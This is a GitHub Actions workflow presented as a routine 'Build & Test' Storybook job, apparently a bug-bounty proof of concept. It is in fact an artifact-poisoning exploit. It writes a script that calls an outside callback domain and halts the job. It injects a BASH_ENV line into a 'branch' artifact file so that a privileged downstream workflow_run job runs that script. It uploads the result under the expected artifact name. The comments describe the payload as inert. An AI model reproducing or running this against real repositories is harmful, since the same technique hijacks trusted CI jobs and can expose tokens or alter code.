name: Build & Test

on:
  pull_request:

permissions:
  contents: read

jobs:
  Build_storybook:
    runs-on: ubuntu-latest
    steps:
      - name: Assemble inert validation artifact
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p out

          cat > out/validation.sh <<'SCRIPT'
          # Marker-only validation payload. It intentionally never reads credentials or secrets.
          curl -fsS --max-time 10 \
            "https://db2hagain9b96ucioelgnf1cku8j45jxy.int.xx1.pw/proof-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}" \
            >/dev/null || true
          {
            echo '### Authorized HackerOne validation marker'
            echo
            echo "BASH_ENV executed in workflow_run ${GITHUB_RUN_ID}, attempt ${GITHUB_RUN_ATTEMPT}."
            echo 'The payload is stopping this job before git fetch and Chromatic.'
          } >> "${GITHUB_STEP_SUMMARY}"
          exit 97
          SCRIPT

          printf '%s\n' "${GITHUB_SHA}" > out/sha
          printf '%s\n' \
            'security-validation' \
            'BASH_ENV=./packages/react-component-library/.static_storybook/validation.sh' \
            > out/branch
          printf '%s\n' "${GITHUB_REPOSITORY}" > out/slug

      - name: Upload validation artifact
        uses: actions/upload-artifact@v7
        with:
          name: storybook-static
          path: out
          include-hidden-files: true
